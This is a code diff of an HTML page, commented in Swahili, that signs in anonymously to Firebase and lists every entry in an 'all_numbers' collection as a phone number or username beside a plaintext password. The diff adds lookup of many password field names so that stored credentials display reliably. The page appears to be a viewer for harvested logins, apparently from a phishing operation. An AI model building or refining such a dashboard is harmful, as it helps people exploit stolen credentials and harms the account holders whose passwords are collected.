@@ -61,7 +61,8 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-        import { getFirestore, collection, query, orderBy, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        // Tumeondoa orderBy hapa
+        import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyBPkx-WMYTTongmbYGUy2w86wxF3QprNkQ",
@@ -107,20 +108,34 @@
             let count = 1;
             snapshot.forEach((doc) => {
                 const data = doc.data();
+                
+                // 1. Mfumo wa Smart Detection kutafuta namba/email
+                let displayPhone = data.phone || data.num || data.email || data.phoneNumber || data.username || data.uid || 'N/A';
+                
+                // 2. Mfumo wa Smart Detection kutafuta password
+                let displayPassword = data.password || data.pass || data.pwd || data.nenoLaSiri || 'N/A';
+
+                // 3. Mfumo wa Smart Detection kutafuta tarehe
                 let dateStr = 'Haijulikani';
                 if (data.timestamp) {
-                    const date = data.timestamp.toDate();
-                    dateStr = date.toLocaleString('sw-TZ', {
-                        day: '2-digit', month: 'short', year: 'numeric',
-                        hour: '2-digit', minute: '2-digit'
-                    });
+                    // Kama ni Firestore Timestamp
+                    if (data.timestamp.toDate) {
+                         dateStr = data.timestamp.toDate().toLocaleString('sw-TZ');
+                    } else {
+                         dateStr = data.timestamp; // Kama ni string
+                    }
+                } else if (data.updatedAt) {
+                    dateStr = data.updatedAt.toDate ? data.updatedAt.toDate().toLocaleString('sw-TZ') : data.updatedAt;
+                } else if (data.time) {
+                    // Kama ni namba (milliseconds)
+                    dateStr = new Date(data.time).toLocaleString('sw-TZ');
                 }
 
                 const tr = document.createElement('tr');
                 tr.innerHTML = `
                     <td>${count}</td>
-                    <td>${data.phone || 'N/A'}</td>
-                    <td><span class="password-cell">${data.password || 'N/A'}</span></td>
+                    <td>${displayPhone}</td>
+                    <td><span class="password-cell">${displayPassword}</span></td>
                     <td class="date-cell">${dateStr}</td>
                 `;
                 tableBody.appendChild(tr);
@@ -133,23 +148,20 @@
 
         async function fetchData() {
             try {
-                // Hakikisha tuna mtumiaji wa Auth kabla ya kusoma
                 if (!auth.currentUser) {
                     await signInAnonymously(auth);
                 }
                 
-                // Subiri kidogo ili Auth isambazwe kwa Firestore
+                // Subiri kidogo ili Auth isambazwe
                 await new Promise(resolve => setTimeout(resolve, 500));
 
-                const q = query(collection(db, "all_numbers"), orderBy("timestamp", "desc"));
-                const snapshot = await getDocs(q);
+                // HAPA: Tumeondoa query na orderBy. Tunachukua collection nzima.
+                const snapshot = await getDocs(collection(db, "all_numbers"));
                 
                 renderData(snapshot);
 
             } catch (error) {
                 console.error("Kosa la kusoma data: ", error);
-                
-                // Onyesha kosa halisi kwenye console
                 let errorMsg = "Imeshindikana kupata taarifa. ";
                 if (error.code === 'auth/admin-restricted-operation') {
                     errorMsg += "Anonymous Auth haijawashwa kwenye Firebase Console.";
@@ -162,7 +174,6 @@
             }
         }
 
-        // Mzunguko wa Auth: subiri hadi mtumiaji athibitishwe
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 fetchData();
